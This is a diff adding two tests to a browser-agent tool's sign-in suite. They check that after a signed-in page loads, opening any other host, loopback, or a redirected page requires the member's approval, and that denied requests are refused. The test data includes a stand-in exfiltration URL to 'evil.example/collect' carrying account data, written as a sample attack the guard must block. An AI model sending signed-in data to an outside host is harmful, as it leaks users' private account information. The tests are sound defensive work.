@@ -1356,6 +1356,71 @@ describe("signin load and unload (07.13-19 Task 3: D-24 … D-26, D-32, PD-16, P
     );
   });
 
+  it("HI-04: after a sign-in loaded, an open to another host asks the member even in Full access, loopback too", async () => {
+    const t = scripted({}, HAS_SIGNIN);
+    t.turn(SIGNIN, true);
+    await t.tools.call("open", { url: `${SITE}/account` });
+    const child = t.children[0] as ScriptedChild;
+
+    // The data the agent read may ride the address: the member decides; Full access skips nothing.
+    const evil = t.tools.call("open", { url: "https://evil.example/collect?d=account-data" });
+    const ask = await nextApproval(t, 1);
+    expect(ask.browser).toEqual({
+      kind: "signed_in_host",
+      origin: "https://evil.example:443",
+      tool: "ocw_browser_open",
+    });
+    expect(ask.summary).not.toContain("account-data");
+    expect(ask.summary).not.toContain("/collect");
+    t.manager.resolveApproval(t.sid, ask.approvalId, "deny");
+    expect((await evil).summary).toBe("Refused: The person you asked did not allow this.");
+    // Denied: the signed-in page stays and nothing else opened.
+    expect(child.state).toBe("running");
+    expect(child.calls.filter((c) => c.op === "open")).toEqual([]);
+
+    // A loopback host asks too.
+    const local = t.tools.call("open", { url: "http://localhost:4000/" });
+    const ask2 = await nextApproval(t, 2);
+    expect(ask2.browser?.kind).toBe("signed_in_host");
+    t.manager.resolveApproval(t.sid, ask2.approvalId, "once");
+    expect((await local).isError).toBe(false);
+
+    // Sticky for the rest of the turn: the signed-in page is closed now, and a third host still needs the member.
+    const third = t.tools.call("open", { url: "http://127.0.0.1:7000/" });
+    const ask3 = await nextApproval(t, 3);
+    expect(ask3.browser?.kind).toBe("signed_in_host");
+    t.manager.resolveApproval(t.sid, ask3.approvalId, "deny");
+    expect((await third).isError).toBe(true);
+    // A host the member allowed in this turn does not ask again.
+    expect((await t.tools.call("open", { url: "http://localhost:4000/other" })).isError).toBe(false);
+    expect(t.approvals()).toHaveLength(3);
+
+    // The next turn starts clean: loopback opens without asking.
+    t.turn(SIGNIN, true);
+    expect((await t.tools.call("open", { url: "http://127.0.0.1:7000/" })).isError).toBe(false);
+    expect(t.approvals()).toHaveLength(3);
+  });
+
+  it("HI-04: a redirect away from the member's site, or a later call on a page that left it, asks the member", async () => {
+    const t = scripted({}, HAS_SIGNIN);
+    t.turn(SIGNIN, true);
+    await t.tools.call("open", { url: `${SITE}/account` });
+    const local = t.tools.call("open", { url: "http://localhost:4000/" });
+    t.manager.resolveApproval(t.sid, (await nextApproval(t, 1)).approvalId, "once");
+    await local;
+    // The public page navigated on its own to another host (a script, a meta refresh).
+    const child = t.children.at(-1) as ScriptedChild;
+    (child as unknown as { o: ChildFactoryOptions }).o.onEvent({
+      event: "navigated",
+      origin: "https://evil.example:443",
+    });
+    const snap = t.tools.call("snapshot", {});
+    const ask = await nextApproval(t, 2);
+    expect(ask.browser).toMatchObject({ kind: "signed_in_host", origin: "https://evil.example:443" });
+    t.manager.resolveApproval(t.sid, ask.approvalId, "deny");
+    expect((await snap).isError).toBe(true);
+  });
+
   it("unload: a revoked sign-in closes the page without re-sealing it", async () => {
     const { put } = sequenced();
     const t = scripted({ api: { put } }, HAS_SIGNIN);
